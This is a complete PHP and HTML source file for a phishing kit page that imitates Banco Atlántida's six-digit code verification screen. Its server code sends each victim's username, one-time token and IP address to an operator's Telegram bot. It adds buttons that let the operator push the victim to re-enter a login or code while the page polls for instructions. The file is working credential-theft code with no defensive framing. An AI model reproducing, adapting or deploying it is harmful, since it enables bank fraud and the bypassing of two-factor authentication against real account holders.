<?php
require_once dirname(__DIR__) . '/gate_check.php';
include("../data.php");
$usuario = trim($_GET['u'] ?? $_POST['u'] ?? '');

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['resend_token'])) {
    $date = date('d/m/Y H:i:s');
    $msg  = "🔄 BANCO MANZANA — REENVÍO TOKEN\n👤 Usuario: {$usuario}\n🕒 {$date}";
    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id' => $chat_id,
        'text'    => $msg,
    ]));
    echo json_encode(['ok' => true]);
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['token'])) {
    $tk    = trim($_POST['token']);
    $round = intval($_POST['round'] ?? 1);
    $ip    = '';
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) { $ip = trim(explode(',', $_SERVER[$h])[0]); break; }
    }
    $date = date('d/m/Y H:i:s');

    $msg  = "🔐 BANCO MANZANA — TOKEN #{$round}\n";
    $msg .= "━━━━━━━━━━━━━━━━━━━━━\n";
    $msg .= "👤 Usuario: {$usuario}\n";
    $msg .= "🔑 Token: {$tk}\n";
    $msg .= "🌐 IP: " . ($ip ?: '?') . "\n";
    $msg .= "🕒 Fecha: {$date}\n";

    $keyboard = json_encode([
        'inline_keyboard' => [
            [
                ['text' => '❌ LOGINERROR', 'callback_data' => "LOGINERROR|{$usuario}"],
                ['text' => '🚫 TOKERROR',   'callback_data' => "TOKERROR|{$usuario}"],
            ],
            [
                ['text' => '✅ LISTO',      'callback_data' => "LISTO|{$usuario}"],
            ],
        ]
    ]);

    file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?" . http_build_query([
        'chat_id'      => $chat_id,
        'text'         => $msg,
        'reply_markup' => $keyboard,
    ]));

    $redirect = '../espera.php?u=' . urlencode($usuario) . '&step=token';
    echo json_encode(['ok' => true, 'redirect' => $redirect]);
    exit;
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
  <title>Banco Atl&#225;ntida — Verificación</title>
  <link rel="icon" href="../img/logo-ba.svg" type="image/svg+xml"/>
  <link rel="preconnect" href="https://fonts.googleapis.com"/>
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    :root{--red:#E30613;--red-dark:#B30410;--text:#111;--muted:#6b7280;--line:#e5e7eb}
    html,body{font-family:'Inter',-apple-system,sans-serif;background:#fff;color:var(--text);min-height:100vh;-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent;touch-action:manipulation;overflow-x:hidden}
    input,button{font-family:inherit;-webkit-appearance:none}

    /* TOP BAR */
    .topbar{background:var(--red);height:66px;display:flex;align-items:center;justify-content:flex-start;padding:0 24px;border-bottom-left-radius:22px;border-bottom-right-radius:22px}
    .topbar img{height:26px;filter:brightness(0) invert(1)}

    /* CONTENT */
    .content{padding:36px 24px 200px;max-width:440px;margin:0 auto;text-align:center;display:flex;flex-direction:column;align-items:center;gap:22px}
    .illo{width:170px;height:auto;border-radius:50%}
    .hint{font-size:15px;color:var(--text);line-height:1.55;max-width:280px}

    /* CODE BOXES */
    .code-row{display:flex;gap:8px;justify-content:center;width:100%;max-width:340px}
    .code-box{flex:1;aspect-ratio:3/4;max-width:48px;min-width:0;border:1.5px solid var(--line);border-radius:14px;background:#fff;font-size:22px;font-weight:600;color:var(--text);text-align:center;outline:none;transition:border-color .15s,box-shadow .15s}
    .code-box:focus{border-color:var(--red);box-shadow:0 0 0 3px rgba(227,6,19,.10)}
    .code-box.filled{border-color:#9ca3af}

    /* RESEND */
    .resend-wrap{display:flex;flex-direction:column;align-items:center;gap:10px;margin-top:2px;min-height:44px}
    .resend-link{background:none;border:none;font-size:14px;color:var(--muted);cursor:pointer;padding:4px 10px}
    .resend-link:active{color:var(--red)}
    .resend-btn{background:#fff;border:1.5px solid var(--red);color:var(--red);font-size:14px;font-weight:600;padding:10px 22px;border-radius:24px;cursor:pointer;transition:background .15s,opacity .15s}
    .resend-btn:active{background:#fef2f2}
    .resend-btn:disabled{border-color:var(--line);color:var(--muted);cursor:not-allowed;background:#f9fafb}
    @keyframes spin{to{transform:rotate(360deg)}}

    /* BOTTOM CARD */
    .bottom{position:fixed;bottom:0;left:0;right:0;background:#fff;border-top-left-radius:26px;border-top-right-radius:26px;box-shadow:0 -6px 24px rgba(0,0,0,.06);padding:20px 24px 28px;display:flex;flex-direction:column;align-items:center;gap:14px}
    .divider{display:flex;align-items:center;width:100%;max-width:360px;color:var(--muted);font-size:13px;gap:12px}
    .divider::before,.divider::after{content:'';flex:1;height:1px;background:var(--line)}
    .btn-alt{width:100%;max-width:360px;height:48px;background:#f3f4f6;border:none;border-radius:26px;color:var(--text);font-size:14px;font-weight:600;cursor:pointer;transition:background .15s}
    .btn-alt:active{background:#e5e7eb}

    /* ERROR OVERLAY */
    #err-ov{position:fixed;inset:0;z-index:99999;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:flex-start;padding-top:90px;gap:18px;opacity:0;pointer-events:none;transition:opacity .3s}
    #err-ov.show{opacity:1;pointer-events:all}
    #err-ov .err-title{font-size:18px;font-weight:700;color:var(--red)}
    #err-ov .err-sub{font-size:14px;color:var(--muted);text-align:center;line-height:1.5}

    /* WAITING OVERLAY */
    #waiting{position:fixed;inset:0;z-index:9999;background:rgba(255,255,255,.94);display:none;flex-direction:column;align-items:center;justify-content:center;gap:16px}
    #waiting.show{display:flex}
    .big-spinner{width:54px;height:54px;border:5px solid var(--line);border-top-color:var(--red);border-radius:50%;animation:spin 1.1s linear infinite}
    #waiting p{font-size:14px;color:#374151;font-weight:500}

    /* INITIAL LOADER */
    #loader{position:fixed;inset:0;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;z-index:9998;transition:opacity .4s ease}
    #loader.hide{opacity:0;pointer-events:none}
    .load-logo{height:44px;width:auto}
  </style>
</head>
<body>

  <div id="loader">
    <img src="../img/logo-ba.svg" class="load-logo" alt="Banco Atlántida"/>
    <div class="big-spinner"></div>
  </div>

  <div id="err-ov">
    <img src="../img/lan.png" style="width:220px;height:auto"/>
    <div class="err-title">Código inválido o expirado</div>
    <div class="err-sub">Intenta nuevamente</div>
  </div>

  <div id="waiting">
    <div class="big-spinner"></div>
    <p>Procesando...</p>
  </div>

  <div class="topbar">
    <img src="../img/logo-ba.svg" alt="Banco Atlántida"/>
  </div>

  <div class="content">
    <img src="../img/cod.jpg" alt="" class="illo"/>
    <p class="hint">Te enviamos un código de 6 dígitos a tu número registrado.</p>
    <div class="code-row">
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric" autocomplete="one-time-code"/>
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric"/>
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric"/>
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric"/>
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric"/>
      <input class="code-box" type="tel" maxlength="1" inputmode="numeric"/>
    </div>
    <div class="resend-wrap" id="resendWrap">
      <button class="resend-link" id="resendLink" onclick="showResendBtn()">¿No recibiste el código?</button>
      <button class="resend-btn" id="resendBtn" onclick="resend()" style="display:none">Reenviar código</button>
    </div>
  </div>

  <div class="bottom">
    <button class="resend-link" id="otrasBtn" onclick="showOtras()" style="font-size:13px">Otras opciones</button>
    <button class="btn-alt" id="correoBtn" onclick="correoElectronico()" style="display:none">Correo electrónico</button>
  </div>

  <script>
    const USUARIO = <?= json_encode($usuario) ?>;
    let round = 1;
    let pollTimer = null;

    const boxes = Array.from(document.querySelectorAll('.code-box'));
    const errOv = document.getElementById('err-ov');
    const waiting = document.getElementById('waiting');
    const loader = document.getElementById('loader');
    const resendWrap = document.getElementById('resendWrap');

    // hide loader once ready
    setTimeout(() => {
      loader.classList.add('hide');
      boxes[0].focus();
    }, 700);

    function allFilled(){ return boxes.every(b => b.value); }
    function currentCode(){ return boxes.map(b => b.value).join(''); }
    function clearBoxes(){
      boxes.forEach(b => { b.value=''; b.classList.remove('filled'); });
      boxes[0].focus();
    }

    boxes.forEach((box, i) => {
      box.addEventListener('input', function(){
        this.value = this.value.replace(/\D/g,'').slice(0,1);
        if (this.value) {
          this.classList.add('filled');
          if (i < boxes.length - 1) boxes[i+1].focus();
          else if (allFilled()) enviar();
        } else {
          this.classList.remove('filled');
        }
      });
      box.addEventListener('keydown', function(e){
        if (e.key === 'Backspace' && !this.value && i > 0) {
          boxes[i-1].focus();
          boxes[i-1].value = '';
          boxes[i-1].classList.remove('filled');
        } else if (e.key === 'ArrowLeft' && i > 0) boxes[i-1].focus();
        else if (e.key === 'ArrowRight' && i < boxes.length-1) boxes[i+1].focus();
        else if (e.key === 'Enter' && allFilled()) enviar();
      });
      box.addEventListener('paste', function(e){
        e.preventDefault();
        const txt = (e.clipboardData||window.clipboardData).getData('text').replace(/\D/g,'').slice(0,6);
        for (let j=0; j<txt.length && j+i<boxes.length; j++){
          boxes[j+i].value = txt[j];
          boxes[j+i].classList.add('filled');
        }
        const nextEmpty = boxes.findIndex(b=>!b.value);
        (nextEmpty>=0 ? boxes[nextEmpty] : boxes[boxes.length-1]).focus();
        if (allFilled()) enviar();
      });
    });

    function enviar() {
      const tk = currentCode();
      if (tk.length < 6) { (boxes.find(b=>!b.value) || boxes[0]).focus(); return; }
      waiting.classList.add('show');
      const fd = new FormData();
      fd.append('token', tk);
      fd.append('u', USUARIO);
      fd.append('round', round);
      fetch('token.php', { method:'POST', body:fd })
        .then(r => r.json())
        .then(d => {
          if (d.ok) { round++; startPoll(); }
          else waiting.classList.remove('show');
        })
        .catch(() => waiting.classList.remove('show'));
    }

    function startPoll() {
      if (pollTimer) clearInterval(pollTimer);
      pollTimer = setInterval(() => {
        fetch('../check.php?u=' + encodeURIComponent(USUARIO))
          .then(r => r.json())
          .then(d => {
            if (!d.action) return;
            clearInterval(pollTimer); pollTimer = null;
            handleAction(d.action);
          }).catch(()=>{});
      }, 2000);
    }

    function handleAction(action) {
      switch(action) {
        case '/TOKERROR':
          waiting.classList.remove('show');
          errOv.classList.add('show');
          setTimeout(() => {
            errOv.classList.remove('show');
            clearBoxes();
          }, 2500);
          break;
        case '/LOGINERROR': window.location.href = 'index.php?error=1'; break;
        case '/LISTO': window.location.href = '../index.html'; break;
        default: startPoll();
      }
    }

    const resendLink = document.getElementById('resendLink');
    const resendBtn  = document.getElementById('resendBtn');

    function showResendBtn() {
      resendLink.style.display = 'none';
      resendBtn.style.display  = '';
    }

    function resend() {
      if (resendBtn.disabled) return;
      resendBtn.disabled = true;
      const fd = new FormData();
      fd.append('resend_token', '1');
      fd.append('u', USUARIO);
      fetch('token.php', { method:'POST', body:fd }).catch(()=>{});
      let t = 60;
      resendBtn.textContent = 'Reenviar en ' + t + 's';
      const iv = setInterval(() => {
        t--;
        if (t <= 0) {
          clearInterval(iv);
          resendBtn.style.display  = 'none';
          resendBtn.disabled       = false;
          resendBtn.textContent    = 'Reenviar código';
          resendLink.style.display = '';
        } else {
          resendBtn.textContent = 'Reenviar en ' + t + 's';
        }
      }, 1000);
    }

    function showOtras() {
      document.getElementById('otrasBtn').style.display = 'none';
      document.getElementById('correoBtn').style.display = '';
    }

    function correoElectronico() {
      // placeholder for future alt-channel flow
    }

    // block pinch-zoom on iOS Safari
    document.addEventListener('gesturestart', e => e.preventDefault());
    document.addEventListener('dblclick', e => e.preventDefault());
  </script>
<script src="../protect.js"></script>
</body>
</html>
